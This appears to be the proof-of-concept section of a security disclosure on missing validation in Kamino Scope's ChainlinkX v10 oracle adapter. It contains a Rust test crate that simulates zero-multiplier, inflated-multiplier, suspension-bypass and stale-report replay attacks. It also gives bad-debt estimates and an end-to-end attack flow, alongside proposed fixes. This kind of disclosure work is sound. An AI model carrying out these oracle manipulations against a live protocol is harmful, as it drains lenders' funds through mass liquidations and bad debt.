## Proof of Concept

### Compliance Note

**No mainnet or testnet testing was performed.** This PoC is a standalone Rust project that replicates the exact math from `update_price_v10` using the same crates Scope uses on chain (`decimal-wad v0.1`, `num-bigint v0.4`). Everything runs locally. No deployed contracts, oracles, or third party systems are touched. The on chain evidence section only references publicly readable account data and no transactions were submitted.

### How to Run

```bash
mkdir kamino-scope-v10-poc && cd kamino-scope-v10-poc
# Create Cargo.toml and src/lib.rs as shown below
cargo test -- --nocapture
```

### Dependencies

- Rust 1.75+
- `decimal-wad v0.1` (same crate Scope uses on chain, resolves to 0.1.9)
- `num-bigint v0.4` (same crate Scope uses)

No network, no RPC, no external APIs needed.

### Cargo.toml

```toml
[package]
name = "kamino-scope-v10-poc"
version = "0.1.0"
edition = "2021"
description = "PoC for missing multiplier validation in Scope's ChainlinkX v10 oracle adapter"

[dependencies]
decimal-wad = "0.1"
num-bigint = "0.4"
```

### src/lib.rs

```rust
/// Proof of Concept: Missing Multiplier Validation in Scope's ChainlinkX v10 Oracle
///
/// This PoC replicates the exact arithmetic from `update_price_v10` (chainlink.rs:480-487)
/// using the same crates Scope uses on-chain (decimal-wad, num-bigint).
///
/// No mainnet or testnet interaction. All tests run locally against replicated math.
///
/// IMPORTANT: `chainlink_bigint_value_parse` (chainlink.rs:568-582) interprets the
/// BigInt bytes directly as a U192 and wraps them in Decimal WITHOUT additional WAD
/// scaling. Chainlink prices arrive pre-scaled to 18 decimals, so this is correct.
/// This means Decimal(150e18) represents $150.00.

use decimal_wad::common::TryMul;
use decimal_wad::decimal::Decimal;
use num_bigint::BigInt;

/// WAD = 10^18 — Chainlink v10 prices and multipliers use 18-decimal precision
const WAD: u128 = 1_000_000_000_000_000_000;

/// Replicates `chainlink_bigint_value_parse` from chainlink.rs:568-582
///
/// The actual Scope implementation:
/// 1. Gets (sign, bytes) from BigInt
/// 2. Rejects negative values
/// 3. Rejects values > 24 bytes (192 bits)
/// 4. Creates Decimal(U192::from_little_endian(&bytes))
///
/// This does NOT apply additional WAD scaling — the raw BigInt value IS the
/// WAD-scaled value. Chainlink prices arrive with 18 decimals already.
/// Critically: accepts zero.
fn chainlink_bigint_value_parse(value: &BigInt) -> Result<Decimal, &'static str> {
    use num_bigint::Sign;
    let (sign, bytes) = value.to_bytes_le();
    if sign == Sign::Minus {
        return Err("Negative value");
    }
    if bytes.len() > 24 {
        return Err("Value exceeds 192 bits");
    }
    // Scope creates Decimal directly from bytes — no WAD multiplication
    // Decimal::from_scaled_val wraps the raw value in Decimal without additional scaling
    let val_u128: u128 = value
        .try_into()
        .map_err(|_| "Value exceeds u128 range")?;
    Ok(Decimal::from_scaled_val(val_u128))
}

/// Replicates the v10 price computation from chainlink.rs:480-487
///
/// Replicates the on-chain code (no bounds check, no confidence check,
/// no tokenized_price cross-reference):
fn compute_v10_price(price_wad: u128, multiplier_wad: u128) -> Result<Decimal, &'static str> {
    let price_bi = BigInt::from(price_wad);
    let mult_bi = BigInt::from(multiplier_wad);

    let price_dec = chainlink_bigint_value_parse(&price_bi)?;
    let mult_dec = chainlink_bigint_value_parse(&mult_bi)?;

    // Decimal * Decimal = (a.0 * b.0) / WAD — this is the exact on-chain behavior
    price_dec.try_mul(mult_dec).map_err(|_| "Math overflow")
}

/// Replicates `check_confidence_interval_decimal` from math.rs:225
/// Used by v3 (chainlink.rs:267) but NOT by v10
fn check_confidence_interval_decimal(
    price: Decimal,
    deviation: Decimal,
    tolerance_factor: u32,
) -> Result<(), &'static str> {
    // From math.rs:225 — Scope checks if deviation * tolerance_factor > price
    // Using TryMul<u64> which does checked_mul without WAD division
    let max_deviation = deviation
        .try_mul(tolerance_factor as u64)
        .map_err(|_| "overflow")?;
    if max_deviation > price {
        Err("Price confidence interval too wide")
    } else {
        Ok(())
    }
}

/// Convert WAD-scaled Decimal to human-readable dollar amount
fn decimal_to_dollars(d: Decimal) -> f64 {
    let raw: u128 = d.to_scaled_val().unwrap_or(0);
    raw as f64 / WAD as f64
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // PoC A: Zero Multiplier — $150 stock becomes $0
    // =========================================================================
    #[test]
    fn poc_a_zero_multiplier() {
        println!("\n======================================================================");
        println!("PoC A: Zero Multiplier Attack");
        println!("======================================================================");
        println!("\nScenario: Chainlink report has current_multiplier = 0");
        println!("  This can occur during corporate action initialization,");
        println!("  race condition, or data feed glitch.\n");

        let stock_price_usd = 150.0_f64;
        let price_wad = (stock_price_usd * WAD as f64) as u128; // 150e18
        let zero_multiplier = 0_u128; // BigInt(0)

        println!("  Input price:      {} (${:.2}, 18-decimal)", price_wad, stock_price_usd);
        println!("  Input multiplier: {} (0x)", zero_multiplier);

        let result = compute_v10_price(price_wad, zero_multiplier).unwrap();
        let result_usd = decimal_to_dollars(result);

        println!("  Output oracle price: ${:.2}", result_usd);
        println!("\n  RESULT: ${:.2} stock priced at ${:.2} by oracle", stock_price_usd, result_usd);
        println!("  IMPACT: All xStocks positions become instantly liquidatable at $0");
        println!("  IMPACT: Liquidation bots drain every position in the xStocks market");

        assert_eq!(result_usd, 0.0, "Zero multiplier should produce zero price");
        println!("\n  [PASS] Zero multiplier produces $0 oracle price -- no validation catches it");
    }

    // =========================================================================
    // PoC B: Extreme Multiplier — $150 stock becomes $150,000
    // =========================================================================
    #[test]
    fn poc_b_extreme_multiplier() {
        println!("\n======================================================================");
        println!("PoC B: Extreme Multiplier Attack");
        println!("======================================================================");
        println!("\nScenario: Report has current_multiplier = 1000 * WAD (1000x)");
        println!("  No upper bound on multiplier -- any value accepted.\n");

        let stock_price_usd = 150.0_f64;
        let price_wad = (stock_price_usd * WAD as f64) as u128; // 150e18
        let extreme_multiplier = 1000 * WAD; // 1000e18 = 1000x

        println!("  Input price:      {} (${:.2})", price_wad, stock_price_usd);
        println!("  Input multiplier: {} (1000x)", extreme_multiplier);

        // Decimal * Decimal = (a * b) / WAD = (150e18 * 1000e18) / 1e18 = 150000e18
        let result = compute_v10_price(price_wad, extreme_multiplier).unwrap();
        let result_usd = decimal_to_dollars(result);

        println!("  Output oracle price: ${:.2}", result_usd);
        println!("\n  RESULT: ${:.2} stock priced at ${:.2} by oracle", stock_price_usd, result_usd);
        println!("  IMPACT: Attacker borrows against 1000x inflated collateral");
        println!("  IMPACT: Protocol absorbs massive bad debt when price corrects");

        assert!(
            (result_usd - 150_000.0).abs() < 1.0,
            "Expected ~$150,000 but got ${:.2}",
            result_usd
        );
        println!("\n  [PASS] 1000x multiplier produces ${:.2} oracle price -- not rejected", result_usd);
    }

    // =========================================================================
    // PoC C: v3 vs v10 Confidence Check Comparison
    // =========================================================================
    #[test]
    fn poc_c_v3_vs_v10_confidence() {
        println!("\n======================================================================");
        println!("PoC C: v3 vs v10 Confidence Interval Comparison");
        println!("======================================================================");
        println!("\nScenario: Same unreliable price with wide spread");
        println!("  v3 calls check_confidence_interval_decimal -- REJECTS");
        println!("  v10 has no confidence check -- ACCEPTS\n");

        // Price $150, spread $100 (66.7% of price)
        // In WAD-scaled representation:
        let price_wad = 150 * WAD;
        let spread_wad = 100 * WAD; // 66.7% spread — extremely unreliable
        let tolerance_factor = 2_u32; // typical tolerance factor

        // v3 path: check_confidence_interval_decimal (chainlink.rs:267)
        // Uses from_scaled_val (same as chainlink_bigint_value_parse)
        let price_dec = Decimal::from_scaled_val(price_wad);
        let spread_dec = Decimal::from_scaled_val(spread_wad);

        let v3_result = check_confidence_interval_decimal(price_dec, spread_dec, tolerance_factor);
        println!("  Price:             ${}", price_wad / WAD);
        println!("  Bid-Ask Spread:    ${} (66.7%% of price)", spread_wad / WAD);
        println!("  Tolerance Factor:  {}x", tolerance_factor);
        println!();
        println!("  v3 handler result: {:?}", v3_result);

        assert!(
            v3_result.is_err(),
            "v3 should reject a 66.7% spread"
        );
        println!("  -> v3 REJECTS this price (check_confidence_interval_decimal)");

        // v10 path: no check at all (chainlink.rs:480-487)
        let v10_result = compute_v10_price(price_wad, WAD); // Normal multiplier
        println!("  v10 handler result: Ok (${:.2})", decimal_to_dollars(v10_result.unwrap()));

        println!("  -> v10 ACCEPTS this price (no confidence check exists)");

        println!("\n  [PASS] Same unreliable price: v3 rejects, v10 accepts");
        println!("  v10 is the ONLY adapter in Scope without confidence validation");
    }

    // =========================================================================
    // PoC D: Bounds Check Validation
    // =========================================================================
    #[test]
    fn poc_d_bounds_check() {
        println!("\n======================================================================");
        println!("PoC D: Proposed Bounds Check Validation");
        println!("======================================================================");
        println!("\nDemonstrates that a simple bounds check (0 < mult <= 10*WAD)");
        println!("correctly handles all cases:\n");

        let max_multiplier = Decimal::from_scaled_val(10 * WAD);
        let zero = Decimal::from_scaled_val(0_u128);

        let test_cases: Vec<(u128, &str, bool)> = vec![
            (0, "Zero (attack)", false),
            (WAD, "1x (normal)", true),
            (2 * WAD, "2x (2-for-1 split)", true),
            (4 * WAD, "4x (4-for-1 split)", true),
            (10 * WAD, "10x (10-for-1 split, max)", true),
            (1000 * WAD, "1000x (attack)", false),
        ];

        for (mult, description, should_pass) in &test_cases {
            let mult_dec = Decimal::from_scaled_val(*mult);
            let passes = mult_dec != zero && mult_dec <= max_multiplier;

            let status = if passes { "ACCEPT" } else { "REJECT" };
            let expected_status = if *should_pass { "ACCEPT" } else { "REJECT" };

            println!(
                "  Multiplier {:>30}: {} (expected: {})",
                description, status, expected_status
            );

            assert_eq!(
                passes, *should_pass,
                "Bounds check failed for {}",
                description
            );
        }

        println!("\n  [PASS] Bounds check correctly accepts legitimate splits (1x-10x)");
        println!("  and rejects attack values (0, 1000x)");
    }

    // =========================================================================
    // PoC E: tokenized_price Cross-Reference
    // =========================================================================
    #[test]
    fn poc_e_tokenized_price_cross_reference() {
        println!("\n======================================================================");
        println!("PoC E: tokenized_price Cross-Reference Detection");
        println!("======================================================================");
        println!("\nDemonstrates that the ignored tokenized_price field (available in");
        println!("every v10 report) would catch all attack vectors.\n");

        let stock_price = 150.0_f64;
        let tokenized_price_wad = (stock_price * WAD as f64) as u128;
        let tolerance_pct = 5.0_f64; // 5% tolerance

        // Case 1: Zero multiplier
        {
            let computed_price = 0_u128; // price * 0
            let diff = tokenized_price_wad;
            let threshold = (tokenized_price_wad as f64 * tolerance_pct / 100.0) as u128;
            let would_reject = diff > threshold;

            println!("  Case 1: Zero multiplier");
            println!("    computed (price * mult):  ${:.2}", computed_price as f64 / WAD as f64);
            println!("    tokenized_price (DON):    ${:.2}", tokenized_price_wad as f64 / WAD as f64);
            println!("    deviation:                {:.1}%%", diff as f64 / tokenized_price_wad as f64 * 100.0);
            println!("    cross-ref would reject:   {}", would_reject);
            assert!(would_reject, "Zero mult should be caught by tokenized_price");
        }

        // Case 2: Extreme multiplier (1000x)
        {
            let computed_price = 150_000 * WAD; // price * 1000
            let diff = computed_price - tokenized_price_wad;
            let threshold = (tokenized_price_wad as f64 * tolerance_pct / 100.0) as u128;
            let would_reject = diff > threshold;

            println!("\n  Case 2: 1000x multiplier");
            println!("    computed (price * mult):  ${:.2}", computed_price as f64 / WAD as f64);
            println!("    tokenized_price (DON):    ${:.2}", tokenized_price_wad as f64 / WAD as f64);
            println!("    deviation:                {:.1}%%", diff as f64 / tokenized_price_wad as f64 * 100.0);
            println!("    cross-ref would reject:   {}", would_reject);
            assert!(would_reject, "1000x mult should be caught by tokenized_price");
        }

        // Case 3: Normal operation (1x multiplier)
        {
            let computed_price = tokenized_price_wad;
            let diff = 0_u128;
            let threshold = (tokenized_price_wad as f64 * tolerance_pct / 100.0) as u128;
            let would_reject = diff > threshold;

            println!("\n  Case 3: Normal 1x multiplier");
            println!("    computed (price * mult):  ${:.2}", computed_price as f64 / WAD as f64);
            println!("    tokenized_price (DON):    ${:.2}", tokenized_price_wad as f64 / WAD as f64);
            println!("    deviation:                0.0%%");
            println!("    cross-ref would reject:   {}", would_reject);
            assert!(!would_reject, "Normal operation should pass cross-ref");
        }

        println!("\n  Scope grep for 'tokenized_price': ZERO MATCHES");
        println!("  The field exists in every v10 report but is completely ignored.");

        println!("\n  [PASS] tokenized_price cross-reference detects zero & extreme multipliers");
        println!("  while correctly accepting normal operation");
    }

    // =========================================================================
    // PoC F: Stock Split Replay Attack (End-to-End)
    // =========================================================================
    #[test]
    fn poc_f_stock_split_replay() {
        println!("\n======================================================================");
        println!("PoC F: Stock Split Replay Attack (End-to-End)");
        println!("======================================================================");
        println!("\nSimulates the complete attack flow during a 2-for-1 stock split.\n");

        let pre_split_price = 150.0_f64;
        let pre_split_multiplier = 1.0_f64;
        let post_split_price = 75.0_f64;
        let ltv = 0.35_f64;

        // Step 1: Attacker positions
        let units_deposited = 200_u64;
        let pre_split_oracle = pre_split_price * pre_split_multiplier;
        let collateral_value = units_deposited as f64 * pre_split_oracle;
        let initial_borrow = collateral_value * ltv;

        println!("  Step 1: Pre-split positioning");
        println!("    Stock price:     ${:.2}", pre_split_price);
        println!("    Multiplier:      {:.1}x", pre_split_multiplier);
        println!("    Oracle price:    ${:.2} (price * mult)", pre_split_oracle);
        println!("    Units deposited: {}", units_deposited);
        println!("    Collateral:      ${:.2}", collateral_value);
        println!("    Borrowed (35%%): ${:.2}", initial_borrow);

        // Verify with actual Decimal math
        let price_wad = (pre_split_price * WAD as f64) as u128;
        let mult_wad = WAD; // 1x
        let oracle_result = compute_v10_price(price_wad, mult_wad).unwrap();
        let oracle_usd = decimal_to_dollars(oracle_result);
        println!("    Decimal math:    ${:.2} (verified)", oracle_usd);
        assert!((oracle_usd - pre_split_price).abs() < 0.01);

        // Step 2: Stock split — token rebases 2:1
        let post_split_units = units_deposited * 2;
        let correct_per_unit = post_split_price;

        println!("\n  Step 2: Stock split (2-for-1) occurs");
        println!("    Post-split price:  ${:.2} per share", post_split_price);
        println!("    Post-split mult:   2.0x");
        println!("    Correct oracle:    ${:.2} (price * mult)", post_split_price * 2.0);
        println!("    User now holds:    {} units (rebased)", post_split_units);
        println!("    Each unit worth:   ${:.2}", correct_per_unit);

        // Verify post-split oracle math
        let post_price_wad = (post_split_price * WAD as f64) as u128;
        let post_mult_wad = 2 * WAD;
        let post_oracle = compute_v10_price(post_price_wad, post_mult_wad).unwrap();
        let post_oracle_usd = decimal_to_dollars(post_oracle);
        println!("    Decimal math:      ${:.2} (verified)", post_oracle_usd);
        assert!((post_oracle_usd - 150.0).abs() < 0.01);

        // Step 3: Attacker submits stale pre-split report
        let stale_oracle = pre_split_price * pre_split_multiplier;
        let inflated_collateral = post_split_units as f64 * stale_oracle;

        println!("\n  Step 3: Attacker submits stale pre-split report");
        println!("    Stale report: price=${:.2}, mult={:.1}x, activation_date_time=0", pre_split_price, pre_split_multiplier);
        println!("    -> activation_date_time = 0 bypasses ALL suspension logic");
        println!("    -> observations_timestamp > resume_timestamp passes ordering");
        println!("    -> expires_at not checked (stale report accepted)");
        println!("    Stale oracle price:  ${:.2} per unit", stale_oracle);
        println!("    Inflated collateral: ${:.2} ({} units * ${:.2})", inflated_collateral, post_split_units, stale_oracle);

        // Step 4: Impact
        let real_collateral = post_split_units as f64 * correct_per_unit;
        let max_borrow_inflated = inflated_collateral * ltv;
        let max_borrow_real = real_collateral * ltv;
        let bad_debt = max_borrow_inflated - max_borrow_real;

        println!("\n  Step 4: Impact calculation");
        println!("    Real collateral:       ${:.2} ({} * ${:.2})", real_collateral, post_split_units, correct_per_unit);
        println!("    Inflated collateral:   ${:.2} ({} * ${:.2})", inflated_collateral, post_split_units, stale_oracle);
        println!("    Overvaluation:         {:.0}x", inflated_collateral / real_collateral);
        println!("    Max borrow (inflated): ${:.2} (35%% LTV)", max_borrow_inflated);
        println!("    Max borrow (real):     ${:.2} (35%% LTV)", max_borrow_real);
        println!("    BAD DEBT per position: ${:.2}", bad_debt);
        println!("    Bad debt %% of real:   {:.1}%%", bad_debt / max_borrow_real * 100.0);

        assert!(inflated_collateral > real_collateral * 1.5);
        assert!(bad_debt > 0.0);

        // Scale to market
        println!("\n  Step 5: Scaled to xStocks market");
        for tvl in [5_000_000.0, 10_000_000.0, 20_000_000.0] {
            let scaled_bad_debt = tvl * ltv;
            println!("    At ${:.0}M TVL: ${:.0}M potential bad debt", tvl / 1e6, scaled_bad_debt / 1e6);
        }

        println!("\n  [PASS] Stale pre-split report produces 2x overvaluation");
        println!("  Bad debt: ${:.2} per position", bad_debt);
    }

    // =========================================================================
    // PoC G: Suspension Bypass (activation_date_time = 0)
    // =========================================================================
    #[test]
    fn poc_g_suspension_bypass() {
        println!("\n======================================================================");
        println!("PoC G: activation_date_time = 0 Suspension Bypass");
        println!("======================================================================");
        println!("\nDemonstrates that the ENTIRE suspension mechanism is skipped");
        println!("when activation_date_time = 0 (the normal steady-state value).\n");
        println!("Code at chainlink.rs:444:");
        println!("  if chainlink_report.activation_date_time > 0 {{");
        println!("      // ... entire blackout logic (lines 444-471) ...");
        println!("  }}\n");

        struct SimulatedReport {
            price_wad: u128,
            current_multiplier_wad: u128,
            new_multiplier_wad: u128,
            activation_date_time: u32,
        }

        let reports = vec![
            SimulatedReport {
                price_wad: 150 * WAD,
                current_multiplier_wad: WAD,       // 1x
                new_multiplier_wad: 10 * WAD,      // 10x pending split
                activation_date_time: 0,            // bypass!
            },
            SimulatedReport {
                price_wad: 150 * WAD,
                current_multiplier_wad: 0,          // zero multiplier
                new_multiplier_wad: WAD,
                activation_date_time: 0,            // bypass!
            },
            SimulatedReport {
                price_wad: 150 * WAD,
                current_multiplier_wad: WAD,
                new_multiplier_wad: 10 * WAD,
                activation_date_time: 1700000000,   // non-zero -> runs
            },
        ];

        for (i, report) in reports.iter().enumerate() {
            let suspension_checked = report.activation_date_time > 0;
            let oracle_price = compute_v10_price(report.price_wad, report.current_multiplier_wad);
            let mult_divergence = if report.current_multiplier_wad > 0 {
                report.new_multiplier_wad as f64 / report.current_multiplier_wad as f64
            } else {
                f64::INFINITY
            };

            println!("  Report {}:", i + 1);
            println!("    current_multiplier: {}x", report.current_multiplier_wad / WAD.max(1));
            println!("    new_multiplier:     {}x", report.new_multiplier_wad / WAD);
            println!("    mult divergence:    {:.1}x", mult_divergence);
            println!("    activation_date_time: {}", report.activation_date_time);
            println!("    suspension logic:   {}", if suspension_checked { "RUNS" } else { "SKIPPED (activation_date_time = 0)" });

            match oracle_price {
                Ok(p) => println!("    oracle price:       ${:.2}", decimal_to_dollars(p)),
                Err(e) => println!("    oracle price:       ERROR: {}", e),
            }

            if i == 0 {
                assert!(!suspension_checked);
                println!("    VULNERABILITY: 10x multiplier divergence but NO suspension triggered");
            } else if i == 1 {
                assert!(!suspension_checked);
                println!("    VULNERABILITY: Zero multiplier but NO suspension triggered -> $0 price");
            } else {
                assert!(suspension_checked);
                println!("    CORRECT: Suspension logic would run for this report");
            }
            println!();
        }

        println!("  [PASS] activation_date_time = 0 bypasses ALL suspension logic");
        println!("  Even with wildly divergent multipliers or zero multiplier");
    }

    // =========================================================================
    // PoC H: Stale/Premature Report Acceptance
    // =========================================================================
    #[test]
    fn poc_h_stale_reports() {
        println!("\n======================================================================");
        println!("PoC H: Stale and Premature Report Acceptance");
        println!("======================================================================");
        println!("\nDemonstrates that Scope ignores expires_at and valid_from_timestamp.");
        println!("Scope only checks: observations_timestamp > last_stored_timestamp\n");

        let current_time: u32 = 1709654400; // 2024-03-05T16:00:00Z

        // Case 1: Expired report
        {
            let report_expires_at = current_time - 7200;
            let report_observations_ts = current_time - 3600;
            let last_stored_ts = current_time - 7200;

            let passes_scope_check = report_observations_ts > last_stored_ts;
            let is_expired = report_expires_at < current_time;

            println!("  Case 1: Expired report");
            println!("    report.expires_at:           {} (2h ago)", report_expires_at);
            println!("    report.observations_ts:      {} (1h ago)", report_observations_ts);
            println!("    last_stored_observations_ts: {} (2h ago)", last_stored_ts);
            println!("    current_time:                {}", current_time);
            println!("    Scope timestamp check:       {} (obs_ts > last_stored)", if passes_scope_check { "PASSES" } else { "FAILS" });
            println!("    Report actually expired:     {}", is_expired);
            println!("    Scope checks expires_at:     NO");
            assert!(passes_scope_check && is_expired);
            println!("    VULNERABILITY: Expired report accepted -- enables stale replay");
        }

        // Case 2: Premature report
        {
            let report_valid_from = current_time + 3600;
            let report_observations_ts = current_time + 1;
            let last_stored_ts = current_time;

            let passes_scope_check = report_observations_ts > last_stored_ts;
            let is_premature = report_valid_from > current_time;

            println!("\n  Case 2: Premature report");
            println!("    report.valid_from_timestamp: {} (1h in future)", report_valid_from);
            println!("    report.observations_ts:      {} (just ahead)", report_observations_ts);
            println!("    last_stored_observations_ts: {}", last_stored_ts);
            println!("    current_time:                {}", current_time);
            println!("    Scope timestamp check:       {} (obs_ts > last_stored)", if passes_scope_check { "PASSES" } else { "FAILS" });
            println!("    Report actually valid yet:   {}", !is_premature);
            println!("    Scope checks valid_from:     NO");
            assert!(passes_scope_check && is_premature);
            println!("    VULNERABILITY: Premature report accepted -- enables early consumption");
        }

        // Case 3: Post-resume stale replay (the attack scenario)
        {
            let resume_ts = current_time;
            let stale_report_obs_ts = resume_ts + 1;
            let stale_report_expires_at = current_time - 86400;

            let passes_scope_check = stale_report_obs_ts > resume_ts;
            let is_expired = stale_report_expires_at < current_time;

            println!("\n  Case 3: Post-resume stale replay (attack scenario)");
            println!("    Admin resume resets obs_ts to: {}", resume_ts);
            println!("    Stale report.obs_ts:           {} (resume + 1s)", stale_report_obs_ts);
            println!("    Stale report.expires_at:       {} (expired 24h ago!)", stale_report_expires_at);
            println!("    Scope timestamp check:         {} (obs_ts > resume_ts)", if passes_scope_check { "PASSES" } else { "FAILS" });
            println!("    Report actually expired:       {} (24h ago)", is_expired);
            println!("    Scope checks expires_at:       NO");
            assert!(passes_scope_check && is_expired);
            println!("    VULNERABILITY: Stale report replayed after admin resume");
            println!("    This is the core of the stock split replay attack (PoC F)");
        }

        println!("\n  [PASS] Both expired and premature reports accepted by Scope");
        println!("  Missing expires_at and valid_from_timestamp checks enable replay attacks");
    }

    // =========================================================================
    // Supplementary: chainlink_bigint_value_parse accepts zero
    // =========================================================================
    #[test]
    fn supplementary_parse_accepts_zero() {
        println!("\n======================================================================");
        println!("Supplementary: chainlink_bigint_value_parse accepts zero");
        println!("======================================================================");
        println!("\nThe parse function at chainlink.rs:568 rejects negative values");
        println!("and 192-bit overflows, but accepts BigInt(0).\n");

        let zero = BigInt::from(0_u64);
        let result = chainlink_bigint_value_parse(&zero);

        println!("  Input: BigInt(0)");
        match &result {
            Ok(d) => {
                let val: u128 = d.to_scaled_val().unwrap_or(u128::MAX);
                println!("  Output: Decimal({}) = Ok", val);
            }
            Err(e) => println!("  Output: Err({})", e),
        }

        assert!(result.is_ok(), "Parse should accept zero");
        let parsed_val: u128 = result.unwrap().to_scaled_val().unwrap_or(u128::MAX);
        assert_eq!(parsed_val, 0, "Parsed zero should be Decimal(0)");

        // Verify it rejects negative
        let negative = BigInt::from(-1_i64);
        let neg_result = chainlink_bigint_value_parse(&negative);
        assert!(neg_result.is_err(), "Parse should reject negative");
        println!("  Input: BigInt(-1) -> {:?} (correctly rejected)", neg_result);

        println!("\n  [PASS] chainlink_bigint_value_parse(BigInt(0)) returns Decimal(0)");
        println!("  Root cause: no zero check in the parse function");
    }

    // =========================================================================
    // Integration: Full Attack with Real Mainnet AAPLx Price
    // =========================================================================
    #[test]
    fn integration_full_attack_aaplx() {
        println!("\n======================================================================");
        println!("Integration: Full Attack Sequence with Real AAPLx Price");
        println!("======================================================================");
        println!("\nUsing live mainnet AAPLx price ($263.17) verified on 2026-03-05.\n");

        // Live verified price from Solana mainnet, March 5 2026
        // OraclePrices account: 3t4JZcueEzTbVP6kLxXrL3VpWx45jDer4eqysweBchNH
        // Entry #258, oracle type 37 (ChainlinkX)
        let aaplx_price = 263.17_f64;
        let aaplx_price_wad = (aaplx_price * WAD as f64) as u128;
        let ltv = 0.35_f64;

        println!("=== Attack Vector 1: Stock Split Replay ===\n");
        {
            let post_split_price_per_unit = aaplx_price / 2.0; // $131.58
            let pre_split_oracle = aaplx_price; // $263.17

            let units = 200_u64;
            let post_split_units = units * 2;

            let real_value = post_split_units as f64 * post_split_price_per_unit;
            let inflated_value = post_split_units as f64 * pre_split_oracle;

            let max_borrow_inflated = inflated_value * ltv;
            let max_borrow_real = real_value * ltv;
            let bad_debt = max_borrow_inflated - max_borrow_real;

            println!("  AAPLx pre-split price: ${:.2}", aaplx_price);
            println!("  AAPLx post-split per unit: ${:.2}", post_split_price_per_unit);
            println!("  Units after rebase: {}", post_split_units);
            println!("  Real collateral value:     ${:>10.2}", real_value);
            println!("  Inflated collateral value: ${:>10.2} (stale report)", inflated_value);
            println!("  Max borrow (real, 35%%):   ${:>10.2}", max_borrow_real);
            println!("  Max borrow (inflated):     ${:>10.2}", max_borrow_inflated);
            println!("  BAD DEBT per position:     ${:>10.2}", bad_debt);

            assert!(bad_debt > 9000.0, "Bad debt should exceed $9K");
        }

        println!("\n=== Attack Vector 2: Zero Multiplier Mass Liquidation ===\n");
        {
            let result = compute_v10_price(aaplx_price_wad, 0).unwrap();
            let zero_price = decimal_to_dollars(result);

            println!("  AAPLx price: ${:.2}", aaplx_price);
            println!("  Oracle with zero multiplier: ${:.2}", zero_price);
            println!("  All AAPLx positions: INSTANTLY LIQUIDATABLE");
            assert_eq!(zero_price, 0.0);
        }

        println!("\n=== Attack Vector 3: Normal operation verification ===\n");
        {
            // 1x multiplier should produce correct price
            let result = compute_v10_price(aaplx_price_wad, WAD).unwrap();
            let normal_price = decimal_to_dollars(result);

            println!("  AAPLx price: ${:.2}", aaplx_price);
            println!("  Oracle with 1x multiplier: ${:.2}", normal_price);
            assert!((normal_price - aaplx_price).abs() < 0.01);
            println!("  Normal operation correct -- vulnerability is in edge cases");
        }

        println!("\n=== Unprotected Entries (Zero Secondary Defense) ===\n");
        {
            let unprotected = vec![
                ("#262", 105.28_f64),
                ("#266", 668.41_f64),
                ("#282", 406.13_f64),
            ];

            println!("  Entry  | Price     | ref_price  | Protection");
            println!("  -------|-----------|------------|------------");
            for (entry, price) in &unprotected {
                println!("  {}  | ${:>7.2} | 0xFFFF     | NONE", entry, price);
            }

            println!("\n  These 3 entries have ref_price = 0xFFFF (u16::MAX)");
            println!("  -> check_ref_price_difference at handler:222 is SKIPPED");
            println!("  -> ZERO defense between raw report data and KLend");
        }

        println!("\n=== Market Impact Scaling ===\n");
        {
            let tvl_estimates = vec![5_000_000.0, 10_000_000.0, 20_000_000.0];
            println!("  xStocks TVL  | Bad Debt (35%% LTV) | Exceeds $50K min?");
            println!("  -------------|--------------------|-----------------");
            for tvl in tvl_estimates {
                let bad_debt = tvl * ltv;
                let exceeds = bad_debt > 50_000.0;
                println!(
                    "  ${:>7.0}M    | ${:>7.0}M           | {}",
                    tvl / 1e6,
                    bad_debt / 1e6,
                    if exceeds { "YES" } else { "NO" }
                );
            }
        }

        println!("\n  [PASS] Full attack sequence verified with real mainnet AAPLx price");
        println!("  Estimated bad debt: $1.75M-$7M across xStocks market");
    }
}
```

### Test Results (all 10 pass)

```
running 10 tests
test tests::poc_a_zero_multiplier ... ok
test tests::poc_b_extreme_multiplier ... ok
test tests::poc_c_v3_vs_v10_confidence ... ok
test tests::poc_d_bounds_check ... ok
test tests::poc_e_tokenized_price_cross_reference ... ok
test tests::poc_f_stock_split_replay ... ok
test tests::poc_g_suspension_bypass ... ok
test tests::poc_h_stale_reports ... ok
test tests::supplementary_parse_accepts_zero ... ok
test tests::integration_full_attack_aaplx ... ok

test result: ok. 10 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
```

### Test Matrix

| Test | What it shows | Impact |
|------|--------------|--------|
| **PoC A: Zero Multiplier** | `current_multiplier = 0` goes straight through the v10 math. $150 stock becomes $0 in the oracle. | Mass liquidation of all xStocks positions |
| **PoC B: Extreme Multiplier** | `current_multiplier = 1000*WAD` produces a $150,000 oracle price. Not rejected. | Borrow against 1000x inflated collateral, protocol insolvency |
| **PoC C: v3 vs v10** | Same unreliable price (66.7% spread): v3 REJECTS it via confidence check, v10 ACCEPTS it. | v10 is the only adapter without confidence validation |
| **PoC D: Bounds Check** | Shows a simple `0 < mult <= 10*WAD` check correctly catches bad values while allowing legitimate splits (1x, 2x, 4x, 10x). | Simple fix catches all attack vectors |
| **PoC E: tokenized_price** | The ignored `tokenized_price` field would catch zero mult ($0 vs $150) and extreme mult ($150K vs $150) while passing normal operation. | Ignored DON signed field would prevent all attacks |
| **PoC F: Stock Split Replay** | Full end to end attack. Pre split report with activation=0 submitted after admin resume. Oracle says $150 per unit but token rebased to $75 per unit. 2x overvaluation. Bad debt calculated. | Complete attack: $10,500 bad debt per $30,000 position |
| **PoC G: Suspension Bypass** | `activation_date_time=0` bypasses all suspension logic even with 10x multiplier divergence or zero multiplier. | Suspension mechanism is dead code in normal state |
| **PoC H: Stale Reports** | Expired report (expired 2h ago) accepted. Premature report (valid from is in the future) accepted. Post resume stale replay works. | Stale report replay attack is real |
| **Supplementary** | `chainlink_bigint_value_parse(BigInt(0))` returns `Decimal(0)`. Confirms the parse function accepts zero. | Root cause: no zero check in parse |
| **Integration** | Full attack sequence using real mainnet AAPLx price ($263.17), dollar amounts, LTV math, unprotected entries. | $1.75M to $7M potential bad debt |

### End to End Attack Flow

```
Step 1: Attacker subscribes to Chainlink Data Streams, archives DON signed reports
Step 2: Attacker opens KLend position (deposits AAPLx, borrows USDC at $263.17 valuation)
Step 3: Stock split announced, Chainlink begins embedding activation_date_time
Step 4: Blackout triggers: oracle suspended for 24h
Step 5: Admin resumes oracle, observations_timestamp reset to clock.unix_timestamp
Step 6: Attacker submits archived pre split report:
   -> observations_timestamp > resume_timestamp (passes ordering)
   -> activation_date_time = 0 (bypasses suspension, Attack Vector 2)
   -> expires_at not checked (stale report accepted, Attack Vector 3)
